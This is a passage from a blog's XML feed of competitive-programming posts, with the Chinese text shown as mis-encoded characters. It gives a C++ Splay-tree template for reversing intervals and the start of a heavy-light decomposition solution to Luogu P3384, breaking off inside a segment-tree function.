é‡Œçš„è¡¨è¾¾:æŠŠSå¾€ä¸Šè½¬ä¸€æ¬¡ï¼‰â†’<img src="https://images2018.cnblogs.com/blog/1335480/201802/1335480-20180222235430206-1994690340.gif" alt="å·¦æ—‹">  </p><hr><p>å³æ—‹ï¼ˆä¸‹é¢ä»£ç é‡Œçš„è¡¨è¾¾:æŠŠEå¾€ä¸Šè½¬ä¸€æ¬¡ï¼‰â†’<img src="https://images2018.cnblogs.com/blog/1335480/201802/1335480-20180222235503124-141509937.gif" alt="å³æ—‹">  </p><hr><p>å›¾ç‰‡æ¥æºï¼š<a href="//blog.csdn.net/sun_tttt/article/details/65445754">http://blog.csdn.net/sun_tttt&#x2F;article&#x2F;details&#x2F;65445754</a><br>(æ–‡ç« æ˜¯ä»‹ç»çº¢é»‘æ ‘çš„ä½†æ˜¯è¿™ä¸ªå·¦æ—‹å³æ—‹æ“ä½œäºŒå‰æœç´¢æ ‘é€šç”¨)<br>è®ºæ–‡é‡Œè®²çš„å¾ˆè¯¦ç»†~<br>å…·ä½“åˆ°è¿™é“é¢˜ï¼Œå¼•ç”¨ä¸€ä¸‹zcyskyåœ¨é¢˜è§£é‡Œç»™å‡ºçš„è§£é‡Šï¼š  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Splayå¯ä»¥ç”¨æ¥ç»´æŠ¤åºåˆ—ã€‚è¿™æ ·çš„è¯æ˜¯æŠŠSplayå½“ä½œä¸€æ£µåŒºé—´æ ‘ã€‚  </span><br><span class="line">æ‰€è°“åŒºé—´æ ‘å’Œæƒå€¼æ ‘çš„åŒºåˆ«ï¼Œå¤§æ¦‚å°±æ˜¯åŒºé—´æ ‘æ¯ä¸ªèŠ‚ç‚¹ä»£è¡¨çš„æ˜¯ä¸€æ®µåŒºé—´ï¼ˆå…¸å‹ä»£è¡¨å°±æ˜¯ä¸€èˆ¬çš„çº¿æ®µæ ‘ï¼‰  </span><br><span class="line">æƒå€¼æ ‘å¥½ç†è§£ä¸€ç‚¹ï¼Œå°±æ˜¯æ¯ä¸ªç‚¹çœŸçš„ä»£è¡¨ä¸€ä¸ªç‚¹ã€‚  </span><br><span class="line">è‡³äºç¿»è½¬æ“ä½œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨Splayçš„è¿‡ç¨‹å®ç°ã€‚è¯¦è§ä»£ç ã€‚(Splayèƒ½ç»´æŠ¤åºåˆ—åè½¬ä¹Ÿæ˜¯å®ƒä½œä¸ºLCTçš„è¾…åŠ©æ ‘çš„æ¡ä»¶ä¹‹ä¸€)</span><br></pre></td></tr></table></figure><p>ä½œä¸ºæ¨¡æ¿é¢˜æ²¡ä»€ä¹ˆå¥½è¯´çš„ã€‚è¿™è¾¹æ–‡ç« ä¸»è¦è®°å½•æ¿å­ç”¨ã€‚æ„Ÿè°¢zcyskyçš„æ¿å­ã€‚   </p><h2 id><a href="#" class="headerlink" title></a><img src="https://images2018.cnblogs.com/blog/1335480/201802/1335480-20180223172902355-916514534.gif"></h2><h3 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 100005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n,m; </span><br><span class="line"><span class="type">int</span> fa[N],ch[N][<span class="number">2</span>],size[N],rev[N],rt;<span class="comment">//fa[a]è¡¨ç¤ºaçš„çˆ¶äº²</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">pushup</span><span class="params">(<span class="type">int</span> x)</span><span class="comment">//ç»´æŠ¤èŠ‚ç‚¹å¤§å°</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    size[x]=size[ch[x][<span class="number">0</span>]]+size[ch[x][<span class="number">1</span>]]+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pushdown</span><span class="params">(<span class="type">int</span> x)</span><span class="comment">//æ ‡è®°ä¸‹ä¼ </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(rev[x])&#123;<span class="comment">//æ˜¯å¦ç¿»è½¬äº†åŒºé—´</span></span><br><span class="line">        <span class="built_in">swap</span>(ch[x][<span class="number">0</span>],ch[x][<span class="number">1</span>]);</span><br><span class="line">        rev[ch[x][<span class="number">0</span>]]^=<span class="number">1</span>;rev[ch[x][<span class="number">1</span>]]^=<span class="number">1</span>;rev[x]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">bool</span> <span class="title">isLeft</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;<span class="keyword">return</span> ch[fa[x]][<span class="number">0</span>] == x;&#125;<span class="comment">//åˆ¤æ–­xæ˜¯ä¸æ˜¯å·¦å„¿å­</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rotate</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> &amp;k)</span><span class="comment">//æ—‹è½¬</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> y=fa[x],z=fa[y];</span><br><span class="line"><span class="type">int</span> kind=<span class="built_in">isLeft</span>(x);</span><br><span class="line">    <span class="keyword">if</span>(y==k)</span><br><span class="line">        k=x;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        ch[z][!<span class="built_in">isLeft</span>(y)]=x;</span><br><span class="line">    ch[y][!kind]=ch[x][kind];</span><br><span class="line">    </span><br><span class="line">    fa[ch[y][!kind]]=y;</span><br><span class="line">    ch[x][kind]=y;</span><br><span class="line">    fa[y]=x;fa[x]=z;</span><br><span class="line">    <span class="built_in">pushup</span>(x);<span class="built_in">pushup</span>(y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">splay</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> &amp;k)</span><span class="comment">//ä¼¸å±•æ“ä½œï¼Œå°†xä¸€ç›´æ—‹è½¬ç›´åˆ°xå°±æ˜¯k</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(x!=k)&#123;</span><br><span class="line">        <span class="type">int</span> y=fa[x],z=fa[y];</span><br><span class="line">        <span class="keyword">if</span>(y!=k)</span><br><span class="line">        <span class="built_in">isLeft</span>(x)^<span class="built_in">isLeft</span>(y) ? <span class="built_in">rotate</span>(x,k):<span class="built_in">rotate</span>(y,k);</span><br><span class="line"><span class="comment">//è¯¥èŠ‚ç‚¹ä¸çˆ¶äº²åˆ†åˆ«æ˜¯ä»–ä»¬çˆ¸çš„å·¦å­©å­\å³å­©å­æˆ–è€…æ˜¯å³å­©å­\å·¦å­©å­æ—‹è½¬2æ¬¡x</span></span><br><span class="line"><span class="comment">//è¯¥èŠ‚ç‚¹ä¸çˆ¶äº²åŒæ˜¯ä»–ä»¬çˆ¸çš„å·¦å­©å­æˆ–åŒæ˜¯å³å­©å­å…ˆæ—‹è½¬ä¸€æ¬¡yå†æ—‹è½¬ä¸€æ¬¡x</span></span><br><span class="line">        <span class="built_in">rotate</span>(x,k);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> f)</span> <span class="comment">//å»ºç«‹ä¸€é¢—å®Œå…¨å¹³è¡¡çš„äºŒå‰æ ‘</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&gt;r)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="type">int</span> mid=(l+r)/<span class="number">2</span>;</span><br><span class="line">    ch[f][!(mid&lt;f)]=mid;</span><br><span class="line">    fa[mid]=f;</span><br><span class="line">    size[mid]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(l==r)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">build</span>(l,mid<span class="number">-1</span>,mid);</span><br><span class="line">    <span class="built_in">build</span>(mid+<span class="number">1</span>,r,mid);</span><br><span class="line">    <span class="built_in">pushup</span>(mid);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> k)</span><span class="comment">//å¯»æ‰¾ä»¥xä¸ºæ ¹çš„å­æ ‘é‡Œç¬¬kå¤§çš„</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">pushdown</span>(x);</span><br><span class="line">    <span class="type">int</span> s=size[ch[x][<span class="number">0</span>]];</span><br><span class="line">    <span class="keyword">if</span>(k==s+<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">if</span>(k&lt;=s)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">find</span>(ch[x][<span class="number">0</span>],k);</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">find</span>(ch[x][<span class="number">1</span>],k-s<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rever</span><span class="params">(<span class="type">int</span> l,<span class="type">int</span> r)</span><span class="comment">//å…³äºå¦‚ä½•ä»Splayä¸­æå–åŒºé—´è¯·çœ‹ä¸Šæ–‡æ€è·¯ä¸­çš„è®ºæ–‡</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> x=<span class="built_in">find</span>(rt,l),y=<span class="built_in">find</span>(rt,r+<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">splay</span>(x,rt);</span><br><span class="line">    <span class="built_in">splay</span>(y,ch[x][<span class="number">1</span>]);</span><br><span class="line">    <span class="type">int</span> z=ch[y][<span class="number">0</span>];</span><br><span class="line">    rev[z]^=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">    rt=(n+<span class="number">3</span>)/<span class="number">2</span>;</span><br><span class="line">    <span class="built_in">build</span>(<span class="number">1</span>,n+<span class="number">2</span>,rt);<span class="comment">//åŒºé—´å·¦å³å„å¤šåŠ 1ä¸ªæ•°æ–¹ä¾¿æå–åŒºé—´</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="type">int</span> L,R;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;L,&amp;R);</span><br><span class="line">        <span class="built_in">rever</span>(L,R);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=n+<span class="number">1</span>;i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,<span class="built_in">find</span>(rt,i)<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Splay </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ´›è°·:P3384 ã€æ¨¡æ¿ã€‘æ ‘é“¾å‰–åˆ†</title>
      <link href="/2018/02/22/%E6%B4%9B%E8%B0%B7P3384%20%E3%80%90%E6%A8%A1%E6%9D%BF%E3%80%91%E6%A0%91%E9%93%BE%E5%89%96%E5%88%86/"/>
      <url>/2018/02/22/%E6%B4%9B%E8%B0%B7P3384%20%E3%80%90%E6%A8%A1%E6%9D%BF%E3%80%91%E6%A0%91%E9%93%BE%E5%89%96%E5%88%86/</url>
      
        <content type="html"><![CDATA[<p>åŸé¢˜åœ°å€:<a href="//www.luogu.org/problemnew/show/P3384">https://www.luogu.org/problemnew/show/P3384</a>  </p><h3 id="é¢˜ç›®ç®€è¿°"><a href="#é¢˜ç›®ç®€è¿°" class="headerlink" title="é¢˜ç›®ç®€è¿°"></a>é¢˜ç›®ç®€è¿°</h3><p>å·²çŸ¥ä¸€æ£µåŒ…å«Nä¸ªç»“ç‚¹çš„æ ‘ï¼ˆè¿é€šä¸”æ— ç¯ï¼‰ï¼Œæ¯ä¸ªèŠ‚ç‚¹ä¸ŠåŒ…å«ä¸€ä¸ªæ•°å€¼ï¼Œéœ€è¦æ”¯æŒä»¥ä¸‹æ“ä½œï¼š  </p><ol><li>æ ¼å¼ï¼š 1 x y z è¡¨ç¤ºå°†æ ‘ä»xåˆ°yç»“ç‚¹æœ€çŸ­è·¯å¾„ä¸Šæ‰€æœ‰èŠ‚ç‚¹çš„å€¼éƒ½åŠ ä¸Šz  </li><li>æ ¼å¼ï¼š 2 x y è¡¨ç¤ºæ±‚æ ‘ä»xåˆ°yç»“ç‚¹æœ€çŸ­è·¯å¾„ä¸Šæ‰€æœ‰èŠ‚ç‚¹çš„å€¼ä¹‹å’Œ  </li><li>æ ¼å¼ï¼š 3 x z è¡¨ç¤ºå°†ä»¥xä¸ºæ ¹èŠ‚ç‚¹çš„å­æ ‘å†…æ‰€æœ‰èŠ‚ç‚¹å€¼éƒ½åŠ ä¸Šz  </li><li>æ ¼å¼ï¼š 4 x è¡¨ç¤ºæ±‚ä»¥xä¸ºæ ¹èŠ‚ç‚¹çš„å­æ ‘å†…æ‰€æœ‰èŠ‚ç‚¹å€¼ä¹‹å’Œ</li></ol><hr><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>æ ‘é“¾å‰–åˆ†è£¸é¢˜ã€‚åšé¢˜æ—¶çœ‹åˆ°ä¸å››ç§æ“ä½œä¸­çš„ä»»ä½•ä¸€ç§æä¸ºç›¸ä¼¼çš„æ“ä½œï¼Œå°±åº”è¯¥ç«‹åˆ»æƒ³åˆ°æ ‘é“¾å‰–åˆ†ï¼ˆå¹¶ä¸”è€ƒè™‘æ˜¯å¦ç»“åˆçº¿æ®µæ ‘è§£ç­”ï¼‰ã€‚<br>å…³äºæ ‘é“¾å‰–åˆ†çš„ä»‹ç»è¯·çœ‹æ­¤å¤„ï¼š<a href="//www.cnblogs.com/yyy2015c01/p/8457795.html">ä¿¡æ¯å­¦ç«èµ›ç›¸å…³ä¼˜ç§€æ–‡ç« åˆé›†</a>  </p><hr><h3 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h3><p>å…·ä½“ä»‹ç»åœ¨æ³¨é‡Šé‡Œã€‚<br>æ¥æºï¼šæ´›è°·ç”¨æˆ·<a href="//www.luogu.org/space/show?uid=47062">@zengqinyi</a>  </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Rint register int</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mem(a,b) memset(a,(b),sizeof(a))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Temp template<span class="string">&lt;typename T&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"><span class="function">Temp <span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    x=<span class="number">0</span>;T w=<span class="number">1</span>,ch=<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch)&amp;&amp;ch!=<span class="string">&#x27;-&#x27;</span>)ch=<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>)w=<span class="number">-1</span>,ch=<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">isdigit</span>(ch))x=(x&lt;&lt;<span class="number">3</span>)+(x&lt;&lt;<span class="number">1</span>)+(ch^<span class="string">&#x27;0&#x27;</span>),ch=<span class="built_in">getchar</span>();</span><br><span class="line">    x=x*w;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mid ((l+r)&gt;&gt;1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> lson rt&lt;&lt;1,l,mid</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rson rt&lt;&lt;1|1,mid+1,r</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> len (r-l+1)</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">200000</span>+<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> n,m,r,mod;</span><br><span class="line"><span class="comment">//è§é¢˜æ„ </span></span><br><span class="line"><span class="type">int</span> e,beg[maxn],nex[maxn],to[maxn],w[maxn],wt[maxn];</span><br><span class="line"><span class="comment">//é“¾å¼å‰å‘æ˜Ÿæ•°ç»„ï¼Œw[]ã€wt[]åˆå§‹ç‚¹æƒæ•°ç»„ </span></span><br><span class="line"><span class="type">int</span> a[maxn&lt;&lt;<span class="number">2</span>],laz[maxn&lt;&lt;<span class="number">2</span>];</span><br><span class="line"><span class="comment">//çº¿æ®µæ ‘æ•°ç»„ã€lazyæ“ä½œ </span></span><br><span class="line"><span class="type">int</span> son[maxn],id[maxn],fa[maxn],cnt,dep[maxn],siz[maxn],top[maxn]; </span><br><span class="line"><span class="comment">//son[]é‡å„¿å­ç¼–å·,id[]æ–°ç¼–å·,fa[]çˆ¶äº²èŠ‚ç‚¹,cnt dfs_clock/dfsåº,dep[]æ·±åº¦,siz[]å­æ ‘å¤§å°,top[]å½“å‰é“¾é¡¶ç«¯èŠ‚ç‚¹ </span></span><br><span class="line"><span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line"><span class="comment">//æŸ¥è¯¢ç­”æ¡ˆ </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span> <span class="comment">//é“¾å¼å‰å‘æ˜ŸåŠ è¾¹ </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    to[++e]=y;</span><br><span class="line">    nex[e]=beg[x];</span><br><span class="line">    beg[x]=e;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//-------------------------------------- ä»¥ä¸‹ä¸ºçº¿æ®µæ ‘ </span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">pushdown</span><span class="params">(<span class="type">int</span> rt,<span class="type">int</span> lenn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    laz[rt&lt;&lt;<span class="number">1</span>]+=laz[rt];</span><br><span class="line">    laz[rt&lt;&lt;<span class="number">1</span>|<span class="number">1</span>]+=laz[rt];</span><br><span class="line">    a[rt&lt;&lt;<span class="number">1</span>]+=laz[rt]*(lenn-(lenn&gt;&gt;<span class="number">1</span>));</span><br><span class="line">    a[rt&lt;&lt;<span class="number">1</span>|<span class="number">1</span>]+=laz[rt]*(lenn&gt;&gt;<span class="number">1</span>);</span><br><span class="line">    a[rt&lt;&lt;<span class="number">1</span>]%=mod;</span><br><span class="line">    a[rt&lt;&lt;<span class="number">1</span>|<span class="number">1</span>]%=mod;</span><br><span class="line">    laz[rt]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">build</span><span class="params">(<span class="type">int</span> rt,<span class="type">int</span> l,<span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l==r)&#123;</span><br><span class="line">        a[rt]=wt[l];</span><br><span class="line">        <span class="keyword">if</span>(a[rt]&gt;mod)a[rt]%=mod;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">build</span>(lson);</span><br><span class="line">    <span class="built_in">build</span>(rson);</span><br><span class="line">    a[rt]=(a[rt&lt;&lt;<span class="number">1</span>]+a[rt&lt;&lt;<span class="number">1</span>|<span class="number">1</span>])%mod;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">query</span><span class="params">(<span class="type">int</span> rt,<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> L,<span class="type">int</span> R)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L&lt;=l&amp;&amp;r&lt;=R) &#123;</span><br><span class="line">    res+=a[rt];</span><br><span class="line">    res%=mod;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(laz[rt])<span class="built_in">pushdown</span>(rt,len);</span><br><span class="line">        <span class="keyword">if</span>(L&lt;=mid)<span class="built_in">query</span>(lson,L,R);</span><br><span class="line">        <span class="keyword">if</span>(R&gt;mid)<span class="built_in">query</span>(rson,L,R);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> rt,<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> L,<span class="type">int</span> R,<span class="type">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L&lt;=l&amp;&amp;r&lt;=R) &#123;</span><br><span class="line">        laz[rt]+=k;</span><br><span class="line">        a[rt]+=k*len;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(laz[rt])<span class="built_in">pushdown</span>(rt,len);</span><br><span class="line">        <span 